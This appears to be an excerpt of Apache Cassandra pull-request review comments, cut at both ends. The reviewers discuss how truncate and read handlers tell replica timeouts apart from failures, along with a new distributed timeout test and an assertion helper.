-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens
+            Map<InetAddressAndPort, RequestFailureReason> failureReasonByEndpoint = new HashMap<>(this.failureReasonByEndpoint);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");

Review Comment:
   What if instead of throwing a `TimeoutException` when there are more timeouts than non-timeouts (okay >=), we just get rid of what's between lines 83 and 88 here? (i.e. We just throw a `TruncateException` with the per-endpoint failure summary snapshot, unless perhaps every single one of the failure reasons is TIMEOUT? Even then, we might want to be able to tell the difference between ""all the replicas failed on TIMEOUT"" and ""we waited too long at the coordinator"".)



;19/Aug/22 17:07;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950410181


##########
src/java/org/apache/cassandra/service/reads/ReadCallback.java:
##########
@@ -120,6 +120,17 @@ public void awaitResults() throws ReadFailureException, ReadTimeoutException
          */
         int received = resolver.responses.size();
         boolean failed = failures > 0 && (blockFor > received || !resolver.isDataPresent());
+        // If all messages came back as a TIMEOUT then signaled=true and failed=true.
+        // Need to distigues between a timeout and a failure (network, bad data, etc.), so store an extra field.

Review Comment:
   ```suggestion
           // Need to distinguish between a timeout and a failure (network, bad data, etc.), so store an extra field.
   ```



;19/Aug/22 17:13;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950421386


##########
test/distributed/org/apache/cassandra/distributed/test/metrics/RequestTimeoutTest.java:
##########
@@ -0,0 +1,191 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test.metrics;
+
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.TimeoutException;
+import java.util.concurrent.atomic.AtomicInteger;
+
+import org.junit.AfterClass;
+import org.junit.Before;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import net.bytebuddy.ByteBuddy;
+import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
+import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperMethod;
+import net.bytebuddy.implementation.bind.annotation.This;
+import org.apache.cassandra.config.Config;
+import org.apache.cassandra.cql3.statements.BatchStatement;
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.ConsistencyLevel;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.AssertionUtils;
+import org.apache.cassandra.exceptions.CasWriteTimeoutException;
+import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteTimeoutException;
+import org.apache.cassandra.net.Verb;
+import org.apache.cassandra.service.paxos.Paxos;
+import org.apache.cassandra.utils.concurrent.Awaitable;
+import org.apache.cassandra.utils.concurrent.Condition;
+import org.assertj.core.api.Assertions;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
+import static net.bytebuddy.matcher.ElementMatchers.takesArguments;
+import static org.apache.cassandra.utils.AssertionUtils.isThrowable;
+
+public class RequestTimeoutTest extends TestBaseImpl
+{
+    private static AtomicInteger NEXT = new AtomicInteger(0);
+    private static Cluster CLUSTER;
+
+    @BeforeClass
+    public static void init() throws IOException
+    {
+        CLUSTER = Cluster.build(3)
+                         .withConfig(c -> c.set(""truncate_request_timeout"", ""10s""))
+                         .withInstanceInitializer(BB::install)
+                         .start();
+        init(CLUSTER);
+        CLUSTER.schemaChange(withKeyspace(""CREATE TABLE %s.tbl (pk int PRIMARY KEY, v int)""));
+    }
+
+    @AfterClass
+    public static void cleanup()
+    {
+        if (CLUSTER != null)
+            CLUSTER.close();
+    }
+
+    @Before
+    public void before()
+    {
+        CLUSTER.filters().reset();
+    }
+
+    @Test
+    public void insert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void update()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""UPDATE %s.tbl SET v=? WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void batchInsert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(batch(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)"")), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void rangeSelect()
+    {
+        CLUSTER.filters().verbs(Verb.RANGE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl""), ConsistencyLevel.ALL))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void select()
+    {
+        CLUSTER.filters().verbs(Verb.READ_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void truncate()
+    {
+        CLUSTER.filters().verbs(Verb.TRUNCATE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""TRUNCATE %s.tbl""), ConsistencyLevel.ALL))
+                  .is(AssertionUtils.rootCauseIs(TimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareSelect()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.SERIAL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class)); // why does write have its own type but not read?
+    }
+
+    @Test
+    public void casV2CommitInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS_COMMIT_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    private static void withPaxos(Config.PaxosVariant variant)
+    {
+        CLUSTER.forEach(i -> i.runOnInstance(() -> Paxos.setPaxosVariant(variant)));
+    }
+
+    private static String batch(String cql)
+    {
+        return ""BEGIN "" + BatchStatement.Type.UNLOGGED.name() + "" BATCH\n"" + cql + ""\nAPPLY BATCH"";
+    }
+
+    public static class BB
+    {
+        public static void install(ClassLoader cl, Integer num)
+        {
+            new ByteBuddy().rebase(Condition.Async.class)
+                           .method(named(""await"").and(takesArguments(2)))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+        }
+
+        public static boolean await(long time, TimeUnit units, @This Awaitable self, @SuperMethod Method method) throws InterruptedException, InvocationTargetException, IllegalAccessException
+        {
+            // attempt to decouple the two usages of write_request_timeout: await(write_request_timeout) and message expire
+            return (boolean) method.invoke(self, time * 10, units);

Review Comment:
   Without this BB injection, the tests seem to pass. Is there a race somewhere that makes this ^ necessary?



;19/Aug/22 17:29;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950425110


##########
test/distributed/org/apache/cassandra/distributed/test/metrics/RequestTimeoutTest.java:
##########
@@ -0,0 +1,191 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test.metrics;
+
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.TimeoutException;
+import java.util.concurrent.atomic.AtomicInteger;
+
+import org.junit.AfterClass;
+import org.junit.Before;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import net.bytebuddy.ByteBuddy;
+import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
+import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperMethod;
+import net.bytebuddy.implementation.bind.annotation.This;
+import org.apache.cassandra.config.Config;
+import org.apache.cassandra.cql3.statements.BatchStatement;
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.ConsistencyLevel;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.AssertionUtils;
+import org.apache.cassandra.exceptions.CasWriteTimeoutException;
+import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteTimeoutException;
+import org.apache.cassandra.net.Verb;
+import org.apache.cassandra.service.paxos.Paxos;
+import org.apache.cassandra.utils.concurrent.Awaitable;
+import org.apache.cassandra.utils.concurrent.Condition;
+import org.assertj.core.api.Assertions;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
+import static net.bytebuddy.matcher.ElementMatchers.takesArguments;
+import static org.apache.cassandra.utils.AssertionUtils.isThrowable;
+
+public class RequestTimeoutTest extends TestBaseImpl
+{
+    private static AtomicInteger NEXT = new AtomicInteger(0);
+    private static Cluster CLUSTER;
+
+    @BeforeClass
+    public static void init() throws IOException
+    {
+        CLUSTER = Cluster.build(3)
+                         .withConfig(c -> c.set(""truncate_request_timeout"", ""10s""))
+                         .withInstanceInitializer(BB::install)
+                         .start();
+        init(CLUSTER);
+        CLUSTER.schemaChange(withKeyspace(""CREATE TABLE %s.tbl (pk int PRIMARY KEY, v int)""));
+    }
+
+    @AfterClass
+    public static void cleanup()
+    {
+        if (CLUSTER != null)
+            CLUSTER.close();
+    }
+
+    @Before
+    public void before()
+    {
+        CLUSTER.filters().reset();
+    }
+
+    @Test
+    public void insert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));

Review Comment:
   A quick search for ""Exception.class.getName()"" shows a handful of places that could definitely be converted to use this. Perhaps a follow-up Jira?



;19/Aug/22 17:34;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950429632


##########
test/unit/org/apache/cassandra/utils/AssertionUtils.java:
##########
@@ -0,0 +1,124 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.utils;
+
+import com.google.common.base.Throwables;
+
+import org.assertj.core.api.Condition;
+
+public class AssertionUtils
+{
+    private AssertionUtils()
+    {
+    }
+
+    /**
+     * When working with jvm-dtest the thrown error is in a different {@link ClassLoader} causing type checks
+     * to fail; this method relies on naming instead.
+     */
+    public static Condition<Object> is(Class<?> klass)
+    {
+        String name = klass.getCanonicalName();
+        return new Condition<Object>() {
+            @Override
+            public boolean matches(Object value)
+            {
+                return value.getClass().getCanonicalName().equals(name);
+            }
+
+            @Override
+            public String toString()
+            {
+                return name;
+            }
+        };
+    }
+
+    public static <T extends Throwable> Condition<Throwable> isThrowable(Class<T> klass)
+    {
+        // org.assertj.core.api.AbstractAssert.is has <? super ? extends Throwable> which blocks <T>, so need to
+        // always return Throwable
+        return (Condition<Throwable>) (Condition<?>) is(klass);

Review Comment:
   nit: I think you can remove the second cast here if you rewrite `is`...
   
   ```
   public static <T> Condition<T> is(Class<T> klass)
   {
       String name = klass.getCanonicalName();
       return new Condition<T>() {
           @Override
           public boolean matches(T value)
           {
               return value.getClass().getCanonicalName().equals(name);
           }
   
           @Override
           public String toString()
           {
               return name;
           }
       };
   }
   ```



;19/Aug/22 17:40;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950458043


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,34 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens
+            Map<InetAddressAndPort, RequestFailureReason> failureReasonByEndpoint = new HashMap<>(this.failureReasonByEndpoint);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
+
+            StringBuilder sb = new StringBuilder(""Truncate failed on "");
+            for (Map.Entry<InetAddressAndPort, RequestFailureReason> e : failureReasonByEndpoint.entrySet())
+                sb.append(""replica "").append(e.getKey()).append(' ').append(e.getValue()).append("", "");

Review Comment:
   `:` may be an issue as that could imply port is missing... but we could do ` -> ` instead of the space?  I also want to make sure there is a space between the replica to avoid any existing log parsers freaking out.



;19/Aug/22 18:19;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950462795


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,34 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens
+            Map<InetAddressAndPort, RequestFailureReason> failureReasonByEndpoint = new HashMap<>(this.failureReasonByEndpoint);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");

Review Comment:
   the bug reported was when 100% of the replies are timeout and we return the wrong exception type, so I wouldn't want to return a `TrucateException` in this case.
   
   Now, if `signal=true && failed`, I guess we have a more fundmental question of ""how many replicas timeout for us to call it a timeout""?  I would prefer we are consistent so would want all read/write/truncate to match the logic...
   
   So, lets say we are dealing with a LOCAL_QUORUM read with rf=6, if failures=3 then we will fail, but lets say we have the following
   
   R1: TIMEOUT
   R2: TIMEOUT
   R3: UNKNOWN
   
   *should* this be a timeout, or should this be an error?  *should* this only ever be a timeout when 100% are timed out?  Personally I feel that if majority are timeout, we actually timed out.  @clohfink thoughts?
   



;19/Aug/22 18:26;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950464907


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,34 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens
+            Map<InetAddressAndPort, RequestFailureReason> failureReasonByEndpoint = new HashMap<>(this.failureReasonByEndpoint);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
+
+            StringBuilder sb = new StringBuilder(""Truncate failed on "");
+            for (Map.Entry<InetAddressAndPort, RequestFailureReason> e : failureReasonByEndpoint.entrySet())
+                sb.append(""replica "").append(e.getKey()).append(' ').append(e.getValue()).append("", "");

Review Comment:
   `->` WFM



;19/Aug/22 18:28;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950464908


##########
test/distributed/org/apache/cassandra/distributed/test/metrics/RequestTimeoutTest.java:
##########
@@ -0,0 +1,191 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test.metrics;
+
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.TimeoutException;
+import java.util.concurrent.atomic.AtomicInteger;
+
+import org.junit.AfterClass;
+import org.junit.Before;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import net.bytebuddy.ByteBuddy;
+import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
+import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperMethod;
+import net.bytebuddy.implementation.bind.annotation.This;
+import org.apache.cassandra.config.Config;
+import org.apache.cassandra.cql3.statements.BatchStatement;
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.ConsistencyLevel;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.AssertionUtils;
+import org.apache.cassandra.exceptions.CasWriteTimeoutException;
+import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteTimeoutException;
+import org.apache.cassandra.net.Verb;
+import org.apache.cassandra.service.paxos.Paxos;
+import org.apache.cassandra.utils.concurrent.Awaitable;
+import org.apache.cassandra.utils.concurrent.Condition;
+import org.assertj.core.api.Assertions;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
+import static net.bytebuddy.matcher.ElementMatchers.takesArguments;
+import static org.apache.cassandra.utils.AssertionUtils.isThrowable;
+
+public class RequestTimeoutTest extends TestBaseImpl
+{
+    private static AtomicInteger NEXT = new AtomicInteger(0);
+    private static Cluster CLUSTER;
+
+    @BeforeClass
+    public static void init() throws IOException
+    {
+        CLUSTER = Cluster.build(3)
+                         .withConfig(c -> c.set(""truncate_request_timeout"", ""10s""))
+                         .withInstanceInitializer(BB::install)
+                         .start();
+        init(CLUSTER);
+        CLUSTER.schemaChange(withKeyspace(""CREATE TABLE %s.tbl (pk int PRIMARY KEY, v int)""));
+    }
+
+    @AfterClass
+    public static void cleanup()
+    {
+        if (CLUSTER != null)
+            CLUSTER.close();
+    }
+
+    @Before
+    public void before()
+    {
+        CLUSTER.filters().reset();
+    }
+
+    @Test
+    public void insert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void update()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""UPDATE %s.tbl SET v=? WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void batchInsert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(batch(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)"")), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void rangeSelect()
+    {
+        CLUSTER.filters().verbs(Verb.RANGE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl""), ConsistencyLevel.ALL))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void select()
+    {
+        CLUSTER.filters().verbs(Verb.READ_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void truncate()
+    {
+        CLUSTER.filters().verbs(Verb.TRUNCATE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""TRUNCATE %s.tbl""), ConsistencyLevel.ALL))
+                  .is(AssertionUtils.rootCauseIs(TimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareSelect()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.SERIAL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class)); // why does write have its own type but not read?
+    }
+
+    @Test
+    public void casV2CommitInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS_COMMIT_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    private static void withPaxos(Config.PaxosVariant variant)
+    {
+        CLUSTER.forEach(i -> i.runOnInstance(() -> Paxos.setPaxosVariant(variant)));
+    }
+
+    private static String batch(String cql)
+    {
+        return ""BEGIN "" + BatchStatement.Type.UNLOGGED.name() + "" BATCH\n"" + cql + ""\nAPPLY BATCH"";
+    }
+
+    public static class BB
+    {
+        public static void install(ClassLoader cl, Integer num)
+        {
+            new ByteBuddy().rebase(Condition.Async.class)
+                           .method(named(""await"").and(takesArguments(2)))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+        }
+
+        public static boolean await(long time, TimeUnit units, @This Awaitable self, @SuperMethod Method method) throws InterruptedException, InvocationTargetException, IllegalAccessException
+        {
+            // attempt to decouple the two usages of write_request_timeout: await(write_request_timeout) and message expire
+            return (boolean) method.invoke(self, time * 10, units);

Review Comment:
   The race is that we use the same timeout for messages and condition wait, so the message expire system needs to happen-before the signal timeout is done.  For me, most of the time signal timeout happens-before message expires, which then means `signal=false`, which means we timeout (and were before).  Now, we need to *FORCE* message expires to happen-before in order to hit the condition this patch is fixing.



;19/Aug/22 18:28;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950464908


##########
test/distributed/org/apache/cassandra/distributed/test/metrics/RequestTimeoutTest.java:
##########
@@ -0,0 +1,191 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test.metrics;
+
